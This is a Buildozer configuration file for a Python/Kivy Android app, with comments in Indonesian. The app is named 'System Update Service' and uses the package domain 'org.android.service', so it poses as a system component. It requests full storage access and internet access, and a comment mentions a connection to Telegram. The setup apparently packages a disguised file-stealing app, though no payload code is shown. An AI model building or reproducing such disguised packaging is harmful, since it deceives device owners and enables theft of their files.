[app]

# (str) Title of your application
title = System Update Service

# (str) Package name
package.name = sysupdate_service

# (str) Package domain (needed for android packaging)
package.domain = org.android.service

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning
version = 1.0.0

# (list) Application requirements
# Gue tambahin certifi & charset biar koneksi ke Telegram lancar
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,idna,charset-normalizer

# (str) Supported orientations
orientation = portrait

# (list) Permissions
# SDK 30 ke atas butuh MANAGE_EXTERNAL_STORAGE buat akses semua file
android.permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,MANAGE_EXTERNAL_STORAGE

# (int) Target Android API (Gue set ke 33, paling stabil buat Buildozer saat ini)
android.api = 33

# (int) Minimum API support (Android 5.0)
android.minapi = 21

# (int) Android SDK version
android.sdk = 33

# (str) Android NDK version (NDK 25b cocok sama API 33)
android.ndk = 25b

# (str) Android build tools version
android.build_tools_version = 33.0.0

# (bool) Use --private data storage
android.private_storage = True

# (str) Log level
log_level = 2

# (str) Android entry point
android.entrypoint = org.kivy.android.PythonActivity

[buildozer]
log_level = 2
warn_on_root = 1
